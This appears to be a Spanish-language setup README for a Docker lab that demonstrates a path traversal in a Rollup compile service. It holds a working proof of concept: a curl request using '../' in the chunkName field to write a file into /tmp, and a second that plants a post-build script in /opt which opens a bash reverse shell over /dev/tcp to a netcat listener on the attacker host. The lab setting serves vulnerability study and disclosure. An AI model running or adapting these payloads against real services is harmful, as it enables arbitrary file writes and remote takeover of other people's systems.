# Setup

## Inicializar contenedores
```bash
docker compose up -d --build
```

## Vm atacante
```bash
# enviar archivo
curl -X POST http://rollup-victima:3000/compile \
     -H "Content-Type: application/json" \
     -d '{
       "chunkName": "sub/../../../../../tmp/archivo_escapado_poc",
       "code": "console.log(\"Archivo inyectado remotamente en /tmp\");"
     }'
```

### Comprometer vm victima
```bash
# ejecutar en terminal 1 de vm atacante
nc -lvnp 4444

# ejecutar en terminal 2 de vm atacante
curl -X POST http://rollup-victima:3000/compile \
     -H "Content-Type: application/json" \
     -d '{
       "chunkName": "sub/../../../../../opt/servicio-interno/post-build",
       "code": "const { exec } = require(\"child_process\"); exec(\"bash -c '\''bash -i >& /dev/tcp/rollup-atacante/4444 0>&1'\''\");"
     }'
```
